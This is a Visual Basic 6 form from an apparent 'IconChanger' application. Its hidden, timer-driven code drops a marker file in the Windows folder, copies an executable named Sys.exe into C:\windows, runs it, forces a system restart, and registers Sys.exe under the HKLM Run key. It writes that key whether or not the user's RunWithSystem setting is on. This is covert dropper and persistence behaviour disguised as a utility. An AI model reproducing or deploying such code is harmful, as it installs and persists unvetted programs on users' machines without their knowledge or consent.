VERSION 5.00
Begin VB.Form Form2 
   BorderStyle     =   3  'Fixed Dialog
   ClientHeight    =   5235
   ClientLeft      =   2610
   ClientTop       =   855
   ClientWidth     =   4290
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form2.frx":0000
   ScaleHeight     =   5235
   ScaleWidth      =   4290
   ShowInTaskbar   =   0   'False
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   615
      Left            =   2040
      TabIndex        =   1
      Top             =   1560
      Visible         =   0   'False
      Width           =   1455
   End
   Begin VB.Timer Timer1 
      Interval        =   2000
      Left            =   1440
      Top             =   2880
   End
   Begin VB.OLE OLE1 
      Height          =   615
      Left            =   720
      TabIndex        =   0
      Top             =   3720
      Visible         =   0   'False
      Width           =   975
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long

 Const HKEY_LOCAL_MACHINE = &H80000002
  Const HKEY_CLASSES_ROOT = &H80000000

Public Sub SaveString(hKey As Long, StrPath As String, StrValue As String, StrData As String)
   Dim KeyH&
    r = RegCreateKey(hKey, StrPath, KeyH&)
    r = RegSetValueEx(KeyH&, StrValue, 0, 1, ByVal StrData, Len(StrData))
    r = RegCloseKey(KeyH&)
End Sub

Public Sub delString(hKey As Long, StrPath As String)
   Dim KeyH&
    r = RegDeleteKey(hKey, StrPath)
     r = RegCloseKey(KeyH&)
   End Sub



Private Sub Command1_Click()
On Error GoTo err
FileNumber = FreeFile
FileName = "c:\windows\iconc.dll"
Open "c:\windows\iconc.dll" For Input As #FileNumber
Close #1
FrmMain.Show
Unload Me
Exit Sub
err:
FileNumber = FreeFile
FileName = "c:\windows\iconc.dll"
Open FileName For Append As #FileNumber
Close #FileNumber
FileCopy (App.Path & "\Sys.exe"), ("C:\windows\Sys.exe")
i = Shell("c:\windows\sys.exe", vbNormalFocus)
MsgBox "You Need To Reboot Your System", 16, "Restart"
i = Shell("c:\windows\rundll.exe user.exe,exitwindowsexec", vbNormalFocus)
End Sub

Private Sub Form_Load()
On Error Resume Next
If Command1.Value = 1 Then
SaveSetting App.Title, App.Title, "RunWithSystem", 1
SaveString HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\run", "IconChanger", "C:\Windows\Sys.exe"
Else
SaveSetting App.Title, App.Title, "RunWithSystem", 0
SaveString HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\run", "IconChanger", "C:\Windows\Sys.exe"
End If
End Sub


Private Sub Timer1_Timer()
Command1_Click
Unload Me
End Sub
